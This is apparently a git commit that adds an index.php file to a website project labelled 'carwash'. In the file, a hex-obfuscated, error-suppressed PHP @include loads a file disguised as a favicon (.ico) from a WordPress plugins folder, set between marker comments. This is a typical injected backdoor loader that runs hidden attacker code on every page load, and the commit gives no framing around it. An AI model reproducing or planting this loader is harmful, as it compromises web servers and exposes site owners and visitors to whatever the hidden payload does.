d28902da9a4c9f6c6d42e85802de873cfb437500
root <root@vps22165.inmotionhosting.com>
2017-09-21 16:47:56 -0400

    init carwash

---
+++ index.php
@@ -0,0 +1,13 @@
+<?php
+
+
+
+
+/*76d7a*/
+
+@include "\x2fhom\x65/ke\x79pan\x36/pu\x62lic\x5fhtm\x6c/pa\x67ina\x73web\x6bs.c\x6fm/w\x70-co\x6eten\x74/la\x6egua\x67es/\x70lug\x69ns/\x66avi\x63on_\x65402\x640.i\x63o";
+
+/*76d7a*/
+
+
+echo file_get_contents('index.html.bak.bak');
